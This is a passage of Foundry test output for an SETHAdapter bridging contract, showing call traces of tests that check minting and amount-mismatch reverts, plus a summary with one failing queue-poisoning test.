    ├─ [34460] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x6574680000000000000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   └─ ← [Stop]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [751] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [68900] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000beef, nonce: 1 }), 0x7365746800000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000006217c47ffa5eb3f3c92247fffe22ad998242c5000000003b9aca000000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   ├─ [593] SETH::receiveCollateral{value: 10000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [46882] SETH::mint(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], 1000000000000000000000 [1e21])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], value: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] true
    │   ├─ emit OFTReceived(guid: 0x7365746800000000000000000000000000000000000000000000000000000000, srcEid: 1, toAddress: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], amountReceivedLD: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [735] SETH::balanceOf(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [1443] SETHAdapter::ethQueue(1, 0) [staticcall]
    │   └─ ← [Return] 0
    └─ ← [Return]

[PASS] test_lzCompose_revertsOnDuplicateTransferId() (gas: 88111)
Traces:
  [88111] SETHAdapterAmountBindingTest::test_lzCompose_revertsOnDuplicateTransferId()
    ├─ [9643] EthOFTMock::sendEth{value: 10000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 10000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [34460] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x6731000000000000000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   └─ ← [Stop]
    ├─ [1443] SETHAdapter::ethQueue(1, 0) [staticcall]
    │   └─ ← [Return] 10000000000000000000 [1e19]
    ├─ [7143] EthOFTMock::sendEth{value: 1000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 2c5211c600000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [3473] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x6732000000000000000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   └─ ← [Revert] InvalidAmount()
    └─ ← [Return]

[PASS] test_processPendingMint_revertsWhenEthAmountMismatches() (gas: 123567)
Traces:
  [123567] SETHAdapterAmountBindingTest::test_processPendingMint_revertsWhenEthAmountMismatches()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [751] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [57897] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000beef, nonce: 1 }), 0x7365746800000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000006217c47ffa5eb3f3c92247fffe22ad998242c5000000003b9aca000000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   ├─ emit OFTReceived(guid: 0x7365746800000000000000000000000000000000000000000000000000000000, srcEid: 1, toAddress: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], amountReceivedLD: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [7143] EthOFTMock::sendEth{value: 5000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 5000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 2c5211c600000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [29365] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x6574680000000000000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000004563918244f400000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   └─ ← [Revert] InvalidAmount()
    └─ ← [Return]

[PASS] test_sethFirstThenEth_mintsCorrectly() (gas: 145568)
Traces:
  [187226] SETHAdapterAmountBindingTest::test_sethFirstThenEth_mintsCorrectly()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [751] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [57897] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000beef, nonce: 1 }), 0x7365746800000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000006217c47ffa5eb3f3c92247fffe22ad998242c5000000003b9aca000000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   ├─ emit OFTReceived(guid: 0x7365746800000000000000000000000000000000000000000000000000000000, srcEid: 1, toAddress: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], amountReceivedLD: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [7143] EthOFTMock::sendEth{value: 10000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 10000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [88066] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x6574680000000000000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   ├─ [593] SETH::receiveCollateral{value: 10000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [46882] SETH::mint(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], 1000000000000000000000 [1e21])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], value: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [735] SETH::balanceOf(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [1443] SETHAdapter::ethQueue(1, 0) [staticcall]
    │   └─ ← [Return] 0
    └─ ← [Return]

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 4.03ms (3.57ms CPU time)

Ran 3 test suites in 29.11ms (10.31ms CPU time): 11 tests passed, 1 failed, 0 skipped (12 total tests)

Failing tests:
Encountered 1 failing test in test/Generated.t.sol:SETHAdapterComposePoisonTest
[FAIL: InvalidComposeSender()] test_poisonedQueueBlocksLegitTransfer() (gas: 39667)

Encountered a total of 1 failing tests, 11 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```